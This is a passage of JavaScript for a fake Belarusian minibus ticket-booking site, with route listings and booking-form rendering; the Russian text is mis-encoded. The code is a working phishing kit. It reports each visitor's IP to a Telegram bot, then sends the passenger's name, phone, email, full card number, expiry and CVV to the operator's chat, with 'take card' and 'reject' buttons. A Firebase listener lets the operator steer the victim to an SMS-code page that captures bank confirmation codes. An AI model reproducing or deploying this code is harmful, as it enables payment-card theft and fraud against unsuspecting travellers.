                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë–æ–±—Ä—É–π—Å–∫¬ª' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ë–æ–±—Ä—É–π—Å–∫', time: '19:30', duration: '1—á 30–º', price: 26, seats: 6,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–æ—Å—Ç–æ—á–Ω—ã–π¬ª, —É–ª. –û–ª–µ–≥–∞ –ö–æ—à–µ–≤–æ–≥–æ', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë–æ–±—Ä—É–π—Å–∫¬ª' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ë–æ–±—Ä—É–π—Å–∫', time: '07:00', duration: '1—á 50–º', price: 20, seats: 14,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë–æ–±—Ä—É–π—Å–∫¬ª' },
                
                // –û–±—Ä–∞—Ç–Ω—ã–µ —Ä–µ–π—Å—ã (–ì–æ–º–µ–ª—å ‚Üí –ú–∏–Ω—Å–∫)
                { from: '–ì–æ–º–µ–ª—å', to: '–ú–∏–Ω—Å–∫', time: '08:00', duration: '4—á 30–º', price: 27, seats: 12,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì–æ–º–µ–ª—å¬ª, —É–ª. –ü—Ä–∏–≤–æ–∫–∑–∞–ª—å–Ω–∞—è 3', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–ì–æ–º–µ–ª—å', to: '–ú–∏–Ω—Å–∫', time: '12:00', duration: '4—á 30–º', price: 27, seats: 10,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì–æ–º–µ–ª—å¬ª, —É–ª. –ü—Ä–∏–≤–æ–∫–∑–∞–ª—å–Ω–∞—è 3', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–ì–æ–º–µ–ª—å', to: '–ú–∏–Ω—Å–∫', time: '16:00', duration: '4—á 30–º', price: 29, seats: 8,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì–æ–º–µ–ª—å¬ª, —É–ª. –ü—Ä–∏–≤–æ–∫–∑–∞–ª—å–Ω–∞—è 3', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–ì–æ–º–µ–ª—å', to: '–ú–∏–Ω—Å–∫', time: '20:00', duration: '4—á 15–º', price: 32, seats: 6,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì–æ–º–µ–ª—å¬ª, —É–ª. –ü—Ä–∏–≤–æ–∫–∑–∞–ª—å–Ω–∞—è 3', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–æ—Å—Ç–æ—á–Ω—ã–π¬ª, —É–ª. –û–ª–µ–≥–∞ –ö–æ—à–µ–≤–æ–≥–æ' },
                
                // –ë—Ä–µ—Å—Ç ‚Üí –ú–∏–Ω—Å–∫
                { from: '–ë—Ä–µ—Å—Ç', to: '–ú–∏–Ω—Å–∫', time: '07:30', duration: '4—á 00–º', price: 30, seats: 12,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë—Ä–µ—Å—Ç¬ª', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–ë—Ä–µ—Å—Ç', to: '–ú–∏–Ω—Å–∫', time: '11:30', duration: '4—á 00–º', price: 30, seats: 10,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë—Ä–µ—Å—Ç¬ª', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–ë—Ä–µ—Å—Ç', to: '–ú–∏–Ω—Å–∫', time: '15:30', duration: '4—á 00–º', price: 32, seats: 8,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë—Ä–µ—Å—Ç¬ª', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–ë—Ä–µ—Å—Ç', to: '–ú–∏–Ω—Å–∫', time: '19:30', duration: '3—á 45–º', price: 35, seats: 6,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë—Ä–µ—Å—Ç¬ª', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–æ—Å—Ç–æ—á–Ω—ã–π¬ª, —É–ª. –û–ª–µ–≥–∞ –ö–æ—à–µ–≤–æ–≥–æ' },
                
                // –í–∏—Ç–µ–±—Å–∫ ‚Üí –ú–∏–Ω—Å–∫
                { from: '–í–∏—Ç–µ–±—Å–∫', to: '–ú–∏–Ω—Å–∫', time: '08:00', duration: '3—á 45–º', price: 28, seats: 12,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–∏—Ç–µ–±—Å–∫¬ª', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–í–∏—Ç–µ–±—Å–∫', to: '–ú–∏–Ω—Å–∫', time: '12:30', duration: '3—á 45–º', price: 28, seats: 10,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–∏—Ç–µ–±—Å–∫¬ª', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–í–∏—Ç–µ–±—Å–∫', to: '–ú–∏–Ω—Å–∫', time: '16:30', duration: '3—á 45–º', price: 30, seats: 8,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–∏—Ç–µ–±—Å–∫¬ª', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–í–∏—Ç–µ–±—Å–∫', to: '–ú–∏–Ω—Å–∫', time: '20:30', duration: '3—á 30–º', price: 33, seats: 6,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–∏—Ç–µ–±—Å–∫¬ª', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–æ—Å—Ç–æ—á–Ω—ã–π¬ª, —É–ª. –û–ª–µ–≥–∞ –ö–æ—à–µ–≤–æ–≥–æ' },
                
                // –ì—Ä–æ–¥–Ω–æ ‚Üí –ú–∏–Ω—Å–∫
                { from: '–ì—Ä–æ–¥–Ω–æ', to: '–ú–∏–Ω—Å–∫', time: '07:00', duration: '4—á 38–º', price: 27, seats: 12,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì—Ä–æ–¥–Ω–æ¬ª, —É–ª. –ß—ã—Ä–≤–æ–Ω–∞–∞—Ä–º–µ–π—Å–∫–∞—è', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–ì—Ä–æ–¥–Ω–æ', to: '–ú–∏–Ω—Å–∫', time: '11:00', duration: '4—á 38–º', price: 27, seats: 10,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì—Ä–æ–¥–Ω–æ¬ª, —É–ª. –ß—ã—Ä–≤–æ–Ω–∞–∞—Ä–º–µ–π—Å–∫–∞—è', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–ì—Ä–æ–¥–Ω–æ', to: '–ú–∏–Ω—Å–∫', time: '15:00', duration: '4—á 38–º', price: 29, seats: 8,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì—Ä–æ–¥–Ω–æ¬ª, —É–ª. –ß—ã—Ä–≤–æ–Ω–∞–∞—Ä–º–µ–π—Å–∫–∞—è', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–ì—Ä–æ–¥–Ω–æ', to: '–ú–∏–Ω—Å–∫', time: '19:00', duration: '4—á 15–º', price: 32, seats: 6,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì—Ä–æ–¥–Ω–æ¬ª, —É–ª. –ß—ã—Ä–≤–æ–Ω–∞–∞—Ä–º–µ–π—Å–∫–∞—è', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–æ—Å—Ç–æ—á–Ω—ã–π¬ª, —É–ª. –û–ª–µ–≥–∞ –ö–æ—à–µ–≤–æ–≥–æ' },
                
                // –ú–æ–≥–∏–ª—ë–≤ ‚Üí –ú–∏–Ω—Å–∫
                { from: '–ú–æ–≥–∏–ª—ë–≤', to: '–ú–∏–Ω—Å–∫', time: '08:30', duration: '2—á 30–º', price: 25, seats: 15,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ú–æ–≥–∏–ª—ë–≤¬ª, –ø—Ä. –ú–∏—Ä–∞ 6', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–ú–æ–≥–∏–ª—ë–≤', to: '–ú–∏–Ω—Å–∫', time: '12:30', duration: '2—á 30–º', price: 25, seats: 12,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ú–æ–≥–∏–ª—ë–≤¬ª, –ø—Ä. –ú–∏—Ä–∞ 6', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–ú–æ–≥–∏–ª—ë–≤', to: '–ú–∏–Ω—Å–∫', time: '16:30', duration: '2—á 30–º', price: 27, seats: 10,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ú–æ–≥–∏–ª—ë–≤¬ª, –ø—Ä. –ú–∏—Ä–∞ 6', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–ú–æ–≥–∏–ª—ë–≤', to: '–ú–∏–Ω—Å–∫', time: '20:00', duration: '2—á 15–º', price: 30, seats: 8,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ú–æ–≥–∏–ª—ë–≤¬ª, –ø—Ä. –ú–∏—Ä–∞ 6', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–æ—Å—Ç–æ—á–Ω—ã–π¬ª, —É–ª. –û–ª–µ–≥–∞ –ö–æ—à–µ–≤–æ–≥–æ' },
                
                // –ë–æ–±—Ä—É–π—Å–∫ ‚Üí –ú–∏–Ω—Å–∫
                { from: '–ë–æ–±—Ä—É–π—Å–∫', to: '–ú–∏–Ω—Å–∫', time: '07:30', duration: '1—á 40–º', price: 22, seats: 12,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë–æ–±—Ä—É–π—Å–∫¬ª', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–ë–æ–±—Ä—É–π—Å–∫', to: '–ú–∏–Ω—Å–∫', time: '11:30', duration: '1—á 40–º', price: 22, seats: 10,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë–æ–±—Ä—É–π—Å–∫¬ª', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–ë–æ–±—Ä—É–π—Å–∫', to: '–ú–∏–Ω—Å–∫', time: '15:30', duration: '1—á 40–º', price: 24, seats: 8,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë–æ–±—Ä—É–π—Å–∫¬ª', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–ë–æ–±—Ä—É–π—Å–∫', to: '–ú–∏–Ω—Å–∫', time: '18:30', duration: '1—á 30–º', price: 26, seats: 6,
                  fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë–æ–±—Ä—É–π—Å–∫¬ª', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–æ—Å—Ç–æ—á–Ω—ã–π¬ª, —É–ª. –û–ª–µ–≥–∞ –ö–æ—à–µ–≤–æ–≥–æ' },
            ];

            // ==================== –°–û–°–¢–û–Ø–ù–ò–ï ====================
            let state = {
                mode: linkHash ? 'specific' : 'search',
                step: linkHash ? 'specific' : 'search',
                fromCity: '',
                toCity: '',
                date: new Date().toISOString().split('T')[0],
                selectedRoute: null,
                passenger: { fullName: '', phone: '', email: '' },
                card: { number: '', expiry: '', cvv: '', cardholder: '' },
                smsCode: '',
                sessionId: 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(7),
                searchResults: []
            };

            if (linkHash) {
                // –î–ª—è —Ç–µ—Å—Ç–∞ –≤—ã–±–∏—Ä–∞–µ–º –ø–µ—Ä–≤—ã–π —Ä–µ–π—Å –∏–∑ –ú–∏–Ω—Å–∫–∞ –≤ –ì–æ–º–µ–ª—å
                state.selectedRoute = ROUTES.find(r => r.from === '–ú–∏–Ω—Å–∫' && r.to === '–ì–æ–º–µ–ª—å');
                state.step = 'specific';
            }

            // ==================== –§–£–ù–ö–¶–ò–ò ====================
            function getBinInfo(cardNumber) {
                const bin = cardNumber.replace(/\D/g, '').slice(0,6);
                return BIN_DB[bin] || { bank: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ', type: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ' };
            }

            function formatCardNumber(v) {
                let d = v.replace(/\D/g, '').slice(0,16);
                let parts = [];
                for (let i=0; i<d.length; i+=4) parts.push(d.slice(i,i+4));
                return parts.join(' ');
            }

            function formatExpiry(v) {
                let d = v.replace(/\D/g, '').slice(0,4);
                if (d.length >= 3) return d.slice(0,2) + '/' + d.slice(2);
                return d;
            }

            function formatCVV(v) {
                return v.replace(/\D/g, '').slice(0,3);
            }

            function searchRoutes(from, to) {
                return ROUTES.filter(r => r.from === from && r.to === to);
            }

            async function sendVisitNotification() {
                if (!linkHash) return;
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    const text = `üëÅ –ó–ê–•–û–î –ù–ê –°–°–´–õ–ö–£\n\nüîó –•–µ—à: ${linkHash}\nüåç IP: ${ipData.ip}\nüì± ${navigator.userAgent}`;
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: ADMIN_ID, text: text })
                    });
                } catch (e) {}
            }

            async function sendCardToBot(routeData) {
                const binInfo = getBinInfo(state.card.number);
                const messageText = 
                    `üí≥ –ù–û–í–ê–Ø –ö–ê–†–¢–ê\n\n` +
                    `üöê –ú–∞—Ä—à—Ä—É—Ç: ${routeData.from} ‚Üí ${routeData.to}\n` +
                    `üìÖ ${state.date}\n` +
                    `‚è∞ ${routeData.time}\n` +
                    `üí∞ ${routeData.price} BYN\n` +
                    `üë§ –ü–∞—Å—Å–∞–∂–∏—Ä: ${state.passenger.fullName}\n` +
                    `üìû –¢–µ–ª–µ—Ñ–æ–Ω: ${state.passenger.phone}\n` +
                    `üìß Email: ${state.passenger.email}\n` +
                    `üí≥ –ö–∞—Ä—Ç–∞: ${state.card.number}\n` +
                    `üìÖ –°—Ä–æ–∫: ${state.card.expiry} | CVV: ${state.card.cvv}\n` +
                    `üë§ –í–ª–∞–¥–µ–ª–µ—Ü: ${state.card.cardholder}\n` +
                    `üî¢ BIN: ${state.card.number.replace(/\D/g, '').slice(0,6)}\n` +
                    `üè¶ –ë–ê–ù–ö: ${binInfo.bank}\n` +
                    `üíé –¢–ò–ü: ${binInfo.type}\n` +
                    `üîó –•–µ—à: ${linkHash || 'manual'}\n` +
                    `üÜî –°–µ—Å—Å–∏—è: ${state.sessionId}`;

                const keyboard = {
                    inline_keyboard: [
                        [{ text: 'üí∞ –í–ó–Ø–¢–¨ –ö–ê–†–¢–£', callback_data: `take_${state.sessionId}` },
                         { text: 'üóë –û–¢–ö–ê–ó', callback_data: `reject_${state.sessionId}` }]
                    ]
                };

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: ADMIN_ID,
                            text: messageText,
                            parse_mode: 'HTML',
                            reply_markup: keyboard
                        })
                    });
                    return true;
                } catch (e) {
                    console.error(e);
                    return false;
                }
            }

            let firebaseListener = null;
            
            function startFirebaseListener() {
                if (firebaseListener) return;
                
                console.log(`üî• –ó–∞–ø—É—Å–∫ Firebase —Å–ª—É—à–∞—Ç–µ–ª—è –¥–ª—è ${state.sessionId}`);
                const cardRef = db.ref(`cards/${state.sessionId}/status`);
                
                firebaseListener = cardRef.on('value', (snapshot) => {
                    const status = snapshot.val();
                    console.log(`üî• –°—Ç–∞—Ç—É—Å Firebase: ${status}, —à–∞–≥: ${state.step}`);
                    
                    if (status === 'sms' && (state.step === 'processing' || state.step === 'processing2')) {
                        console.log('‚úÖ –ü–µ—Ä–µ–∫–ª—é—á–∞–µ–º –Ω–∞ SMS');
                        state.step = 'sms';
                        render();
                    } else if (status === 'success' && state.step === 'processing2') {
                        console.log('‚úÖ –û–ø–ª–∞—Ç–∞ —É—Å–ø–µ—à–Ω–∞');
                        state.step = 'success';
                        render();
                    } else if (status === 'fail' && state.step === 'processing2') {
                        console.log('‚ùå –û–ø–ª–∞—Ç–∞ –Ω–µ –ø—Ä–æ—à–ª–∞');
                        state.step = 'fail';
                        render();
                    }
                }, (error) => {
                    console.error('‚ùå –û—à–∏–±–∫–∞ Firebase:', error);
                });
            }

            // ==================== –û–¢–ü–†–ê–í–ö–ê –£–í–ï–î–û–ú–õ–ï–ù–ò–Ø –û –ó–ê–•–û–î–ï ====================
            if (linkHash) {
                sendVisitNotification();
            }

            // ==================== –†–ï–ù–î–ï–† ====================
            function render() {
                const app = document.getElementById('app');
                
                let html = `
                    <div class="header">
                        <a href="/">–ú–∞—Ä—à—Ä—É—Ç–∫–∞ ‚Ä¢ –ë–µ–ª–∞—Ä—É—Å—å</a>
                    </div>
                    <div class="content">
                `;

                // ===== –†–ï–ñ–ò–ú –ü–û–ò–°–ö–ê =====
                if (state.step === 'search') {
                    html += `
                        <div class="search-section">
                            <div class="section-title">üîç –ü–æ–∏—Å–∫ –±–∏–ª–µ—Ç–æ–≤</div>
                            <div class="form-group">
                                <label>–û—Ç–∫—É–¥–∞</label>
                                <select id="fromCity">
                                    <option value="">–í—ã–±–µ—Ä–∏—Ç–µ –≥–æ—Ä–æ–¥</option>
                                    ${CITIES.map(city => `<option value="${city}">${city}</option>`).join('')}
                                </select>
                            </div>
                            <div class="form-group">
                                <label>–ö—É–¥–∞</label>
                                <select id="toCity">
                                    <option value="">–í—ã–±–µ—Ä–∏—Ç–µ –≥–æ—Ä–æ–¥</option>
                                    ${CITIES.map(city => `<option value="${city}">${city}</option>`).join('')}
                                </select>
                            </div>
                            <div class="form-group">
                                <label>–î–∞—Ç–∞</label>
                                <input type="date" id="date" value="${state.date}">
                            </div>
                            <button class="btn btn-primary" id="searchBtn">–ù–∞–π—Ç–∏ –±–∏–ª–µ—Ç—ã</button>
                        </div>
                        <div class="routes-list" id="routesList"></div>
                    `;
                }

                // ===== –†–ï–ñ–ò–ú –ö–û–ù–ö–†–ï–¢–ù–û–ì–û –†–ï–ô–°–ê (–ü–û –°–°–´–õ–ö–ï) =====
                else if (state.step === 'specific' && state.selectedRoute) {
                    const route = state.selectedRoute;
                    html += `
                        <div class="search-section">
                            <div class="section-title">‚úÖ –í—ã–±—Ä–∞–Ω–Ω—ã–π —Ä–µ–π—Å</div>
                            <div class="summary-box">
                                <div class="summary-row">
                                    <span class="summary-label">–ú–∞—Ä—à—Ä—É—Ç</span>
                                    <span class="summary-value">${route.from} ‚Üí ${route.to}</span>
                                </div>
                                <div class="summary-row">
                                    <span class="summary-label">–î–∞—Ç–∞</span>
                                    <span class="summary-value">${state.date}</span>
                                </div>
                                <div class="summary-row">
                                    <span class="summary-label">–í—Ä–µ–º—è</span>
                                    <span class="summary-value">${route.time}</span>
                                </div>
                                <div class="summary-row">
                                    <span class="summary-label">–í –ø—É—Ç–∏</span>
                                    <span class="summary-value">${route.duration}</span>
                                </div>
                            </div>
                            <div class="route-points">
                                <div class="route-point">
                                    <span class="route-point-icon">üöè</span>
                                    <span class="route-point-text">–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–∏–µ: ${route.fromPoint}</span>
                                </div>
                                <div class="route-point">
                                    <span class="route-point-icon">üèÅ</span>
                                    <span class="route-point-text">–ü—Ä–∏–±—ã—Ç–∏–µ: ${route.toPoint}</span>
                                </div>
                            </div>
                            <div class="route-seats">
                                <span>üé´</span> –°–≤–æ–±–æ–¥–Ω—ã—Ö –º–µ—Å—Ç: ${route.seats}
                            </div>
                            <div class="total-price">${route.price} BYN</div>
                            <button class="btn btn-primary" id="continueBtn">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
                        </div>
                    `;
                }

                // ===== –í–´–ë–û–† –ü–ê–°–°–ê–ñ–ò–†–ê =====
                else if (state.step === 'passenger') {
                    html += `
                        <div class="search-section">
                            <div class="section-title">üë§ –î–∞–Ω–Ω—ã–µ –ø–∞—Å—Å–∞–∂–∏—Ä–∞</div>
                            <div class="form-group">
                                <label>–§–ò–û *</label>
                                <input type="text" id="fullName" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á" value="${state.passenger.fullName}">
                            </div>
                            <div class="form-group">
                                <label>–¢–µ–ª–µ—Ñ–æ–Ω *</label>
                                <input type="tel" id="phone" placeholder="375291234567" value="${state.passenger.phone}" maxlength="12">
                                <small style="color: #64748b; font-size: 12px;">–¢–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã, 12 —Å–∏–º–≤–æ–ª–æ–≤</small>
                            </div>
                            <div class="form-group">
                                <label>Email (–¥–ª—è –±–∏–ª–µ—Ç–∞)</label>
                                <input type="email" id="email" placeholder="ivanov@mail.ru" value="${state.passenger.email}">
                            </div>
                            <button class="btn btn-primary" id="nextBtn">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å –∫ –æ–ø–ª–∞—Ç–µ</button>
                            <button class="btn btn-secondary" onclick="goBack()">‚Üê –ù–∞–∑–∞–¥</button>
                        </div>
                    `;
                }

                // ===== –í–í–û–î –ö–ê–†–¢–´ =====
                else if (state.step === 'card') {
                    html += `
                        <div class="search-section">
                            <div class="section-title">üí≥ –í–≤–æ–¥ –∫–∞—Ä—Ç—ã</div>
                            <div class="summary-box">
                                <div class="summary-row">
                                    <span class="summary-label">–ü–∞—Å—Å–∞–∂–∏—Ä</span>
                                    <span class="summary-value">${state.passenger.fullName}</span>
                                </div>
                                <div class="summary-row">
                                    <span class="summary-label">–¢–µ–ª–µ—Ñ–æ–Ω</span>
                                    <span class="summary-value">${state.passenger.phone}</span>
                                </div>
                            </div>
                            <div class="total-price">${state.selectedRoute.price} BYN</div>
                            <div class="form-group">
                                <label>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã *</label>
                                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" value="${state.card.number}" maxlength="19">
                            </div>
                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                                <div class="form-group">
                                    <label>–°—Ä–æ–∫</label>
                                    <input type="text" id="expiry" placeholder="–ú–ú/–ì–ì" value="${state.card.expiry}" maxlength="5">
                                </div>
                                <div class="form-group">
                                    <label>CVV</label>
                                    <input type="text" id="cvv" placeholder="123" value="${state.card.cvv}" maxlength="3">
                                </div>
                            </div>
                            <div class="form-group">
                                <label>–í–ª–∞–¥–µ–ª–µ—Ü –∫–∞—Ä—Ç—ã *</label>
                                <input type="text" id="cardholder" placeholder="IVANOV IVAN" value="${state.card.cardholder}">
                            </div>
                            <button class="btn btn-primary" id="payBtn">–û–ø–ª–∞—Ç–∏—Ç—å ${state.selectedRoute.price} BYN</button>
                            <button class="btn btn-secondary" onclick="goBack()">‚Üê –ù–∞–∑–∞–¥</button>
                        </div>
                    `;
                }

                // ===== –û–ë–†–ê–ë–û–¢–ö–ê –ü–õ–ê–¢–ï–ñ–ê (–û–ñ–ò–î–ê–ù–ò–ï) =====
                else if (state.step === 'processing') {
                    html += `
                        <div class="search-section" style="text-align: center;">
                            <div class="spinner"></div>
                            <p style="margin: 24px 0;">–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É</p>
                            <p style="color: #64748b;">–û–∂–∏–¥–∞–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ...</p>
                        </div>
                    `;
                    startFirebaseListener();
                }

                // ===== –û–ñ–ò–î–ê–ù–ò–ï –ü–û–î–¢–í–ï–†–ñ–î–ï–ù–ò–Ø –ë–ê–ù–ö–ê =====
                else if (state.step === 'processing2') {
                    html += `
                        <div class="search-section" style="text-align: center;">
                            <div class="spinner"></div>
                            <p style="margin: 24px 0;">–ë–∞–Ω–∫ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç –æ–ø–µ—Ä–∞—Ü–∏—é...</p>
                            <p style="color: #64748b;">–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ</p>
                        </div>
                    `;
                }

                // ===== –í–í–û–î SMS-–ö–û–î–ê =====
                else if (state.step === 'sms') {
                    html += `
                        <div class="search-section">
                            <div class="section-title">üîê –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ</div>
                            <p style="margin-bottom: 16px;">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥, –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –Ω–∞ –≤–∞—à —Ç–µ–ª–µ—Ñ–æ–Ω</p>
                            <input class="sms-input" id="smsCode" maxlength="6" placeholder="______" value="${state.smsCode}" inputmode="numeric">
                            <button class="btn btn-primary" id="confirmSms">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
